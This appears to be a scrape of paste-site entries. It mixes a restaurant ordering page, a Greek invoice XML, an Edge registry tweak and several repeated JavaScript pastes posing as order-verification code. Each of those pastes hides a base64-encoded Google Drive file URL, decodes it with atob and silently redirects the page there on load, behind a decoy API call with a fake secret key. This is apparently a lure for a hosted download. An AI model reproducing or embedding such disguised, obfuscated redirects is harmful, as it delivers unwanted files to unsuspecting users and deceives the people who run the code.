          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
w5Qthwi0,vCardRestaurant-Codigo-Corregido-EUROS,oscarviedma,HTML,Saturday 29th of March 2025 02:59:31 PM CDT,"<div id=""preloader"" class=""loadingio-spinner-rolling-zt8qwybayi"">
  <div class=""ldio-pk6mhbe1fco"">
    <div></div>
  </div>
</div>

<section id=""ov-listado-menu"">
<!-- Aquí es donde se cargará el contenido dinámico -->
</section>

<script>
  // Función para actualizar la pestaña activa y hacer scroll horizontal según la posición de scroll
  function updateActiveTab() {
    var tabLinks = document.querySelectorAll('#tabs a');
    var sections = document.querySelectorAll('.titulo-seccion');
    var scrollPosition = document.querySelector('.contenido').scrollTop;
    var offset = -50; 
    sections.forEach(function(section, index) {
      var sectionTop = section.offsetTop;
      var sectionHeight = section.offsetHeight;
      if (scrollPosition >= sectionTop - offset && scrollPosition < sectionTop + sectionHeight - offset) {
        tabLinks.forEach(function(link) {
          link.classList.remove('active');
        });
        tabLinks[index].classList.add('active');
        // Hacer scroll horizontal para mostrar la pestaña activa
        var tabsContainer = document.getElementById('tabs');
        var activeTab = tabLinks[index];
        var tabLeft = activeTab.offsetLeft;
        var tabWidth = activeTab.offsetWidth;
        var tabsWidth = tabsContainer.offsetWidth;
        var tabsScrollLeft = tabsContainer.scrollLeft;
        if (tabLeft < tabsScrollLeft) {
          tabsContainer.scrollTo({
            left: tabLeft,
            behavior: 'smooth'
          });
        } else if (tabLeft + tabWidth > tabsScrollLeft + tabsWidth) {
          tabsContainer.scrollTo({
            left: tabLeft + tabWidth - tabsWidth,
            behavior: 'smooth'
          });
        }
      }
    });
  }
  
  // Función para mostrar el precargador
  function showPreloader() {
    document.getElementById('preloader').style.display = 'block';
    document.getElementById('ov-listado-menu').style.display = 'none';
  }
  
  // Función para ocultar el precargador y mostrar el contenido
  function hidePreloader() {
    document.getElementById('preloader').style.display = 'none';
    document.getElementById('ov-listado-menu').style.display = 'block';
  }
  
  // Mostrar el precargador al cargar la página
  showPreloader();
  
  var cartItems = [];
    var currency = ""EUR""; // CAMBIAR MONEDA
    var currencySymbol = """"; // CAMBIAR SIMBOLO MONEDA
  
    var appScriptUrl = 'https://script.google.com/macros/s/AKfycbxjEq46zgfhLEPmBZWp21r9cH6wLp7tFcdykYh7e8-YGTQ9cUmRv7WybmjNl-7pufjszg/exec'; // INSERTAR URL APPSCRIPT
    var whatsappNumber = '+34636593115'; // INSERTAR NÚMERO WHATSAPP CON PREFIJO DE PAÍS
  
    // Función para generar el HTML del menú
    function generateMenuHTML(menuData) {
      var html = '';
      var tabs = '';

      for (var section in menuData) {
        var sectionId = section.toLowerCase().replace(/\s+/g, '-');
        tabs += '<a href=""#' + sectionId + '"">' + section + '</a>\n';
        html += '<h2 id=""' + sectionId + '"" class=""titulo-seccion"">' + section + '</h2>';

        menuData[section].forEach(function(dish) {
          // Asegúrate de que el precio se maneje como un número
          var price = parseFloat(dish.price);
          html += '<div class=""card-menu"" data-dish=""' + encodeURIComponent(JSON.stringify({ ...dish, price: price })) + '"">' +
            '<div class=""img-cover"">' +
              '<img src=""' + dish.image + '"" alt=""' + dish.name + '"">' +
            '</div>' +
            '<div class=""info-menu"">' +
              '<h3 class=""titulo"">' + dish.name + '</h3>' +
              '<p class=""descripcion"">' + dish.description + '</p>' +   
              '<p class=""menu-precio"">' + currencySymbol + price.toFixed(2) + ' ' + currency + '</p>' +
            '</div>' +
          '</div>';
        });
      }

      // Insertar las pestañas en el contenedor de pestañas
      document.getElementById('tabs').innerHTML = tabs;

      return html;
    }
  
    // Función para generar el HTML de las opciones extras
    function generateOptionsHTML(options) {
      var html = '';
  
      for (var optionTitle in options) {
        html += '<div class=""option-group"">';
        html += '<h4>' + optionTitle + '</h4>';
  
        options[optionTitle].forEach(function(option) {
          var optionName = option.name;
          var optionPrice = option.price;
  
          html += '<div class=""option-item"">';
          html += '<input type=""checkbox"" id=""' + optionName + '"" value=""' + optionPrice + '"">';
          html += '<label for=""' + optionName + '"">' + optionName + (optionPrice ? ' ' + currencySymbol + optionPrice : '') + '</label>';
          html += '</div>';
        });
  
        html += '</div>';
      }
  
      return html;
    }
  
    // Función para abrir el pop-up de detalles del producto
    function openPopup(dish) {
      var price = parseFloat(dish.price);
      var popupHtml = '<div class=""popup"">' +
        '<div class=""popup-content"">' +
          '<div class=""popup-left"">' +
            '<img src=""' + dish.image + '"" alt=""' + dish.name + '"">' +
          '</div>' +
          '<div class=""popup-right"">' +
            '<div class=""popup-content-wrapper"">' +
              '<h3>' + dish.name + '</h3>' +
              '<p>' + dish.description + '</p>' +
              '<div class=""options-container"">' + generateOptionsHTML(dish.options) + '</div>' +
            '</div>' +
            '<div class=""quantity-control-container"">' +
              '<div class=""quantity-control"">' +
                '<button class=""decrement-quantity"">-</button>' +
                '<input type=""text"" class=""quantity"" value=""1"" data-price=""' + price + '"">' +
                '<button class=""increment-quantity"">+</button>' +
              '</div>' +
              '<button class=""agregar-al-carrito"" data-dish=""' + encodeURIComponent(JSON.stringify({...dish, price: price})) + '"">Agregar <span class=""precio"">' + currencySymbol + price.toFixed(2) + ' ' + currency + '</span></button>' +
            '</div>' +
          '</div>' +
          '<i class=""fas fa-times icono-cerrar""></i>' +
        '</div>' +
      '</div>';
      document.body.insertAdjacentHTML('beforeend', popupHtml);
      setTimeout(function() {
        document.querySelector('.popup').classList.add('show');
      }, 50);
  
      document.querySelectorAll('.option-item input[type=""checkbox""], .quantity').forEach(input => {
        input.addEventListener('change', updatePopupPrice);
      });
  
      document.querySelector('.agregar-al-carrito').addEventListener('click', () => {
        updatePopupPrice();
        addToCart(JSON.parse(decodeURIComponent(document.querySelector('.agregar-al-carrito').getAttribute('data-dish'))));
        closePopup();
      });
    }
  
    function updatePopupPrice() {
      const dish = JSON.parse(decodeURIComponent(document.querySelector('.agregar-al-carrito').getAttribute('data-dish')));
      const selectedOptions = Array.from(document.querySelectorAll('.option-item input[type=""checkbox""]:checked'));
      const quantity = parseInt(document.querySelector('.quantity').value);
      let totalPrice = parseFloat(dish.price) * quantity;
  
      selectedOptions.forEach(option => {
        const optionPrice = parseFloat(option.value);
        if (!isNaN(optionPrice)) {
          totalPrice += optionPrice * quantity;
        }
      });
  
      document.querySelector('.popup .precio').textContent = currencySymbol + totalPrice.toFixed(2) + ' ' + currency;
    }
  
    // Función para cerrar el pop-up
    function closePopup() {
      var popup = document.querySelector('.popup');
      if (popup) {
        popup.classList.remove('show');
        setTimeout(function() {
          popup.remove();
        }, 300);
      }
    }
  
    // Evento de clic para cerrar el pop-up al hacer clic en el overlay
    document.addEventListener('click', function(e) {
      if (e.target.classList.contains('popup')) {
        closePopup();
      }
    });
  
    // Evento de teclado para cerrar los pop-ups con la tecla ESC
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') {
        closePopup();
      }
    });
  
    // Función para añadir un producto al carrito
    function addToCart(dish) {
      var quantity = parseInt(document.querySelector('.quantity').value);
      var selectedOptions = Array.from(document.querySelectorAll('.option-item input[type=""checkbox""]:checked'));

      var dishWithOptions = {
        ...dish,
        price: parseFloat(dish.price), // Asegúrate de que el precio sea un número
        quantity: quantity,
        selectedOptions: selectedOptions.map(function(option) {
          return {
            name: option.nextElementSibling.textContent.split(' ' + currencySymbol)[0].trim(),
            price: parseFloat(option.value) // Asegúrate de que el precio de la opción sea un número
          };
        })
      };

      cartItems.push(dishWithOptions);

      updateCartCount();
      updateCartPopup();
    }
  
    // Función para actualizar el contador del carrito
    function updateCartCount() {
      var cartCount = document.querySelector('.cart-count');
      cartCount.textContent = cartItems.reduce(function(total, item) {
        return total + item.quantity;
      }, 0);
    }
  
    // Función para actualizar el contenido del pop-up del carrito
    function updateCartPopup() {
      var cartPopup = document.querySelector('.cart-popup');
      if (cartPopup) {
        var cartList = cartPopup.querySelector('ul');
        var cartTotal = calculateCartTotal(cartItems);
        listItems = cartItems.map(function(item) {
          var optionsText = item.selectedOptions.map(function(option) {
            return '- ' + option.name + ' ' + (option.price ? currencySymbol + option.price.toFixed(2) : '');
          }).join('<br>');

          var itemTotal = calculateItemTotal(item);
          var basePrice = parseFloat(item.price);

          return '<li>' +
            '<div class=""cart-item"">' +
              '<img src=""' + item.image + '"" alt=""' + item.name + '"">' +
              '<div class=""cart-item-details"">' +
                '<h4>' + item.name + '</h4>' +
                '<p class=""list-cantidad"">Cantidad: ' + item.quantity + '</p>' +
                '<p class=""list-precio"">Precio base: ' + currencySymbol + basePrice.toFixed(2) + ' ' + currency + '</p>' +
                (optionsText ? '<p class=""list-opciones""><b>Opciones:</b><br>' + optionsText + '</p>' : '') +
                '<p class=""list-item-total""><b>Total: ' + currencySymbol + itemTotal.toFixed(2) + ' ' + currency + '</b></p>' +
              '</div>' +
              '<i class=""fas fa-trash remove-item"" data-dish=""' + encodeURIComponent(JSON.stringify(item)) + '""></i>' +
            '</div>' +
          '</li>';
        }).join('');
        cartList.innerHTML = listItems;
        cartPopup.querySelector('.cart-total').textContent = cartTotal;

        if (cartItems.length === 0) {
          cartPopup.querySelector('.cart-empty').style.display = 'block';
          cartPopup.querySelector('#complete-order').disabled = true;
        } else {
          cartPopup.querySelector('.cart-empty').style.display = 'none';
          cartPopup.querySelector('#complete-order').disabled = false;
        }
      }
    }
  
    // Función para calcular el total de cada item del carrito
    function calculateItemTotal(item) {
      var itemPrice = parseFloat(item.price);
      item.selectedOptions.forEach(function(option) {
        var optionPrice = option.price ? parseFloat(option.price) : 0;
        itemPrice += optionPrice;
      });
      return itemPrice * item.quantity;
    }
  
    // Función para abrir el pop-up del carrito
    function openCartPopup() {
      var cartTotal = calculateCartTotal(cartItems);
      var popupHtml = '<div class=""popup"">' +
        '<div class=""cart-popup"">' +
          '<div class=""cart-content"">' +
            '<h2>Mi Pedido</h2>' +
            '<ul></ul>' +
            '<div class=""cart-empty"" style=""display: ' + (cartItems.length === 0 ? 'block' : 'none') + '"">El carrito está vacío.</div>' +
          '</div>' +
          '<div class=""cart-actions"">' +
            '<div class=""cart-total"">Total: ' + cartTotal + '</div>' +
            '<button class=""empty-cart"">Vaciar carrito</button>' +
            '<button id=""complete-order"" ' + (cartItems.length === 0 ? 'disabled' : '') + '>Completar pedido</button>' +
          '</div>' +
          '<i class=""fas fa-times icono-cerrar""></i>' +
        '</div>' +
      '</div>';
      
      document.body.insertAdjacentHTML('beforeend', popupHtml);
      setTimeout(function() {
        document.querySelector('.popup').classList.add('show');
      }, 50);
      updateCartPopup();
    }
  
    // Función para eliminar un producto del carrito
    function removeFromCart(dish) {
      var index = cartItems.findIndex(function(item) {
        return JSON.stringify(item) === JSON.stringify(dish);
      });
      if (index !== -1) {
        cartItems.splice(index, 1);
        updateCartCount();
        updateCartPopup();
      }
    }
  
    // Función para vaciar el carrito
    function emptyCart() {
      cartItems = [];
      updateCartCount();
      var popup = document.querySelector('.popup');
      if (popup) {
        popup.classList.remove('show');
        setTimeout(function() {
          popup.remove();
        }, 300);
      }
    }
  
    // Función para calcular el total del carrito
    function calculateCartTotal(items) {
      var total = 0;
      items.forEach(function(item) {
        var itemPrice = parseFloat(item.price);
        item.selectedOptions.forEach(function(option) {
          var optionPrice = option.price ? parseFloat(option.price) : 0;
          itemPrice += optionPrice;
        });
        total += itemPrice * item.quantity;
      });
      return 'Total Pedido: ' + currencySymbol + total.toFixed(2) + ' ' + currency;
    }
  
    // Función para mostrar el formulario de información del pedido
    function showOrderForm() {
      var formHtml = '<div class=""order-form"">' +
        '<a id=""back-to-cart""><i class=""fas fa-arrow-left""></i> Regresar al carrito</a>' +
        '<h2>Completa tu pedido</h2>' +
        '<form>' +
          '<label for=""name"">Nombre:</label>' +
          '<input type=""text"" id=""name"" required>' +
                  '<label for=""name"">Teléfono:</label>' +
                  '<input type=""text"" id=""phone"" required>' +
          '<label for=""delivery"">Opciones de entrega:</label>' +
          '<select id=""delivery"" required>' +
            '<option value="""">Selecciona una opción</option>' +
            '<option value=""Domicilio"">Envío a domicilio</option>' +
            '<option value=""Local"">Recoger en local</option>' +
          '</select>' +
          '<div id=""address-field"" style=""display: none;"">' +
            '<label for=""address"">Dirección:</label>' +
            '<textarea id=""address"" required></textarea>' +
          '</div>' +
          '<label for=""payment"">Formas de pago:</label>' +
          '<select id=""payment"" required>' +
            '<option value="""">Selecciona una opción</option>' +
            '<option value=""Efectivo"">Efectivo</option>' +
            '<option value=""Tarjeta"">Tarjeta</option>' +
          '</select>' +
          '<label for=""note"">Nota adicional:</label>' +
          '<textarea id=""note""></textarea>' +
          '<div class=""terminos"">' +
            '<input type=""checkbox"" id=""terms"" required>' +
            '<label for=""terms"">Acepto los <a href=""#"" target=""_blank"">términos y condiciones</a>.</label>' +
          '</div>' +
          '<button type=""submit"" id=""submit-order""><i class=""fab fa-whatsapp""></i> Enviar pedido</button>' +
        '</form>' +
      '</div>';
  
      var cartPopup = document.querySelector('.cart-popup');
      var cartDetails = cartPopup.querySelector('.cart-content');
      var cartActions = cartPopup.querySelector('.cart-actions');
      cartDetails.style.display = 'none';
      cartActions.style.display = 'none';
      cartPopup.insertAdjacentHTML('beforeend', formHtml);
      setTimeout(function() {
        document.querySelector('.popup').classList.add('show');
      }, 50);
  
      var backButton = document.getElementById('back-to-cart');
        backButton.addEventListener('click', function(e) {
          e.preventDefault();
          var popup = document.querySelector('.popup');
          popup.classList.remove('show');
          setTimeout(function() {
            var orderForm = document.querySelector('.order-form');
            orderForm.remove();
            cartDetails.style.display = 'block';
            cartActions.style.display = 'block';
            setTimeout(function() {
              popup.classList.add('show');
            }, 50);
          }, 300);
        });
  
      var deliverySelect = document.getElementById('delivery');
      var addressField = document.getElementById('address-field');
  
      deliverySelect.addEventListener('change', function() {
        if (deliverySelect.value === 'Domicilio') {
          addressField.style.display = 'block';
          addressField.querySelector('#address').required = true;
        } else {
          addressField.style.display = 'none';
          addressField.querySelector('#address').required = false;
        }
      });
    }
  
    // Evento de clic para los ""card-menu""
    document.addEventListener('click', function(e) {
      if (e.target.closest('.card-menu')) {
        var dish = JSON.parse(decodeURIComponent(e.target.closest('.card-menu').getAttribute('data-dish')));
        openPopup(dish);
      }
    });
  
    // Evento de clic para el icono de cierre del pop-up
    document.addEventListener('click', function(e) {
      if (e.target.classList.contains('icono-cerrar')) {
        closePopup();
      }
    });
  
    // Evento de clic para el icono del carrito
    document.getElementById('cart-icon').addEventListener('click', function() {
      openCartPopup();
    });
  
    // Evento de clic para el botón ""Completar pedido""
    document.addEventListener('click', function(e) {
      if (e.target.id === 'complete-order') {
        if (cartItems.length === 0) {
          alert('Para completar el pedido, debes agregar productos al carrito.');
        } else {
          var popup = document.querySelector('.popup');
          popup.classList.remove('show');
          setTimeout(function() {
            showOrderForm();
          }, 300);
        }
      }
    });
  
    // Evento de clic para el icono de eliminar producto del carrito
    document.addEventListener('click', function(e) {
      if (e.target.classList.contains('remove-item')) {
        var dish = JSON.parse(decodeURIComponent(e.target.getAttribute('data-dish')));
        removeFromCart(dish);
      }
    });
  
    // Evento de clic para el botón ""Vaciar carrito""
    document.addEventListener('click', function(e) {
      if (e.target.classList.contains('empty-cart')) {
        emptyCart();
      }
    });
  
    // Evento de clic para los botones de incremento y decremento de cantidad
    document.addEventListener('click', function(e) {
      if (e.target.classList.contains('increment-quantity')) {
        var quantityInput = e.target.previousElementSibling;
        var currentQuantity = parseInt(quantityInput.value);
        quantityInput.value = currentQuantity + 1;
        updatePopupPrice();
      } else if (e.target.classList.contains('decrement-quantity')) {
        var quantityInput = e.target.nextElementSibling;
        var currentQuantity = parseInt(quantityInput.value);
        if (currentQuantity > 1) {
          quantityInput.value = currentQuantity - 1;
          updatePopupPrice();
        }
      }
    });
  
    // Evento de envío del formulario de información del pedido
    document.addEventListener('submit', function(e) {
      if (e.target.closest('.order-form')) {
        e.preventDefault();
        var name = document.getElementById('name').value;
        var delivery = document.getElementById('delivery').value;
        var payment = document.getElementById('payment').value;
        var note = document.getElementById('note').value;

        if (name === '' || delivery === '' || payment === '') {
          alert('Por favor, completa todos los campos obligatorios del formulario.');
          return;
        }

        var addressField = document.getElementById('address');
        var address = addressField.value;

        if (delivery === 'Domicilio' && address === '') {
          alert('Por favor, ingresa tu dirección para el envío a domicilio.');
          return;
        }

        var cartTotal = calculateCartTotal(cartItems);
        var message = '¡NUEVO PEDIDO!\n\n' +
        `Nombre: ${document.getElementById('name').value}\n` +
        `Opciones de entrega: ${document.getElementById('delivery').value}\n` +
        (document.getElementById('delivery').value === 'Domicilio' ? `Dirección: ${addressField.value}\n` : '') +
        `Formas de pago: ${document.getElementById('payment').value}\n` +
        `Nota adicional: ${document.getElementById('note').value}\n` +
          'Productos:\n' +
          cartItems.map(function(item) {
            var itemPrice = parseFloat(item.price);
            var optionsText = item.selectedOptions.map(function(option) {
              var optionPrice = parseFloat(option.price);
              return '  - ' + option.name + ' ' + (optionPrice ? currencySymbol + optionPrice.toFixed(2) : '');
            }).join('\n');
            return '- ' + item.name + ' (' + item.quantity + ') ' + currencySymbol + itemPrice.toFixed(2) + ' ' + currency + '\n' + optionsText;
          }).join('\n\n') + '\n\n' +
          cartTotal;
        var whatsappUrl = 'https://wa.me/' + whatsappNumber + '?text=' + encodeURIComponent(message);
        window.open(whatsappUrl, '_blank');
      }
    });
  
    // Hacer una solicitud GET a la URL de la aplicación web de Google Apps Script
    fetch(appScriptUrl)
    .then(response => response.json())
    .then(data => {
      // Convertir precios a números
      for (let section in data) {
        data[section] = data[section].map(dish => ({
          ...dish,
          price: parseFloat(dish.price)
        }));
      }
      // Llamar a la función para generar el HTML del menú con los datos obtenidos
      document.getElementById('ov-listado-menu').innerHTML = generateMenuHTML(data);
  
     // Agregar evento de clic a las pestañas para el desplazamiento suave
     var tabLinks = document.querySelectorAll('#tabs a');
      tabLinks.forEach(function(link) {
        link.addEventListener('click', function(e) {
          e.preventDefault();
          var target = document.querySelector(this.getAttribute('href'));
          var contenido = document.querySelector('.contenido');
          var targetPosition = target.offsetTop - contenido.offsetTop + 145; 
          contenido.scrollTo({
            top: targetPosition,
            behavior: 'smooth'
          });
        });
      });
  
      // Agregar evento de scroll al contenedor "".contenido""
      document.querySelector('.contenido').addEventListener('scroll', updateActiveTab);
  
      // Ocultar el precargador y mostrar el contenido
      hidePreloader();
    })
    .catch(error => {
      console.error('Error al obtener los datos:', error);
    });
  </script>"
3hC7LiWy,Dumps,LVL23HT,CSS,Saturday 29th of March 2025 02:38:32 PM CDT,https://www.mmkburma.vip/m/home
2bdvVfXf,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 02:27:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/210/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
d9LikzTb,Stop Edge to ask you change search engine to Bing,corrosiontears,Batch,Saturday 29th of March 2025 02:19:16 PM CDT,"// Force disable ""features hints"" that obligates users to change the default search engine back do Bing on Edge //
// https://www.elevenforum.com/t/can-i-stop-this-bing-notice.27754/ //
// Run the command line on powershell as administrator to create the policy enter on regedit

reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v ""SpotlightExperiencesAndRecommendationsEnabled"" /t REG_DWORD /d 0 /f

// After that you can see if it works typing ""edge://policy"" on browser and clicking in ""refresh policies"".
"
W0tagZkh,Untitled,robloxhack212,JavaScript,Saturday 29th of March 2025 02:12:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/076/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X4AzbUDC,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 01:56:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/678/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dnX3YmiY,1.1 isDeliveryNote=true,kspatharas,XML,Saturday 29th of March 2025 01:41:21 PM CDT,"<InvoicesDoc xmlns=""http://www.aade.gr/myDATA/invoice/v1.0"" xmlns:icls=""https://www.aade.gr/myDATA/incomeClassificaton/v1.0"" xmlns:ecls=""https://www.aade.gr/myDATA/expensesClassificaton/v1.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">
  <invoice>
    <issuer>
      <vatNumber>ΧΧΧΧΧΧΧΧ</vatNumber>
      <country>GR</country>
      <branch>0</branch>
      <name>ΧΧΧΧΧΧΧΧ</name>
      <address>
        <street>ΧΧΧΧΧΧΧΧ</street>
        <number>21</number>
        <postalCode>54645</postalCode>
        <city>ΘΕΣΣΑΛΟΝΙΚΗ</city>
      </address>
    </issuer>
    <counterpart>
      <vatNumber>ΧΧΧΧΧΧΧΧ</vatNumber>
      <country>GR</country>
      <branch>0</branch>
      <name>ΧΧΧΧΧΧΧΧ</name>
      <address>
        <street>ΧΧΧΧΧΧΧΧ</street>
        <number>23</number>
        <postalCode>57010</postalCode>
        <city>ΠΕΥΚΑ</city>
      </address>
    </counterpart>
    <invoiceHeader>
      <series>0</series>
      <aa>2</aa>
      <issueDate>2025-03-29</issueDate>
      <invoiceType>1.1</invoiceType>
      <currency>EUR</currency>
      <dispatchDate>2025-03-31</dispatchDate>
      <dispatchTime>10:00:00</dispatchTime>
      <vehicleNumber>XXX5445</vehicleNumber>
      <movePurpose>1</movePurpose>
      <otherDeliveryNoteHeader>
        <loadingAddress>
          <street>XXXXX</street>
          <number>21</number>
          <postalCode>54645</postalCode>
          <city>ΘΕΣΣΑΛΟΝΙΚΗ</city>
        </loadingAddress>
        <deliveryAddress>
          <street>XXXXX</street>
          <number>8</number>
          <postalCode>57010</postalCode>
          <city>ΠΕΥΚΑ</city>
        </deliveryAddress>
      </otherDeliveryNoteHeader>
      <isDeliveryNote>true</isDeliveryNote>
    </invoiceHeader>
    <paymentMethods>
      <paymentMethodDetails>
        <type>3</type>
        <amount>32.40</amount>
        <paymentMethodInfo>
        </paymentMethodInfo>
      </paymentMethodDetails>
    </paymentMethods>
    <invoiceDetails>
      <lineNumber>1</lineNumber>
      <itemCode>U888894</itemCode>
      <itemDescr><![CDATA[ΕΙΔΟΣ 1]]></itemDescr>
      <quantity>1.00</quantity>
      <measurementUnit>1</measurementUnit>
      <netValue>8.06</netValue>
      <vatCategory>1</vatCategory>
      <vatAmount>1.94</vatAmount>
      <lineComments>ΕΙΔΟΣ 1</lineComments>
      <incomeClassification>
        <icls:classificationType>E3_561_001</icls:classificationType>
        <icls:classificationCategory>category1_1</icls:classificationCategory>
        <icls:amount>8.06</icls:amount>
      </incomeClassification>
    </invoiceDetails>
    <invoiceDetails>
      <lineNumber>2</lineNumber>
      <itemCode>U10001147</itemCode>
      <itemDescr><![CDATA[ΧΧΧΧΧΧΧΧ]]></itemDescr>
      <quantity>2.00</quantity>
      <measurementUnit>1</measurementUnit>
      <netValue>19.82</netValue>
      <vatCategory>2</vatCategory>
      <vatAmount>2.58</vatAmount>
      <lineComments>ΧΧΧΧΧΧΧΧ</lineComments>
      <incomeClassification>
        <icls:classificationType>E3_561_001</icls:classificationType>
        <icls:classificationCategory>category1_1</icls:classificationCategory>
        <icls:amount>19.82</icls:amount>
      </incomeClassification>
    </invoiceDetails>
    <invoiceSummary>
      <totalNetValue>27.88</totalNetValue>
      <totalVatAmount>4.52</totalVatAmount>
      <totalWithheldAmount>0.00</totalWithheldAmount>
      <totalFeesAmount>0.00</totalFeesAmount>
      <totalStampDutyAmount>0.00</totalStampDutyAmount>
      <totalOtherTaxesAmount>0.00</totalOtherTaxesAmount>
      <totalDeductionsAmount>0.00</totalDeductionsAmount>
      <totalGrossValue>32.40</totalGrossValue>
      <incomeClassification>
        <icls:classificationType>E3_561_001</icls:classificationType>
        <icls:classificationCategory>category1_1</icls:classificationCategory>
        <icls:amount>27.88</icls:amount>
      </incomeClassification>
    </invoiceSummary>
  </invoice>
</InvoicesDoc>"
hjurWy2N,Order.js,robloxhack212,JavaScript,Saturday 29th of March 2025 01:41:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/456/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q0Mu5s08,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 01:25:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/360/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
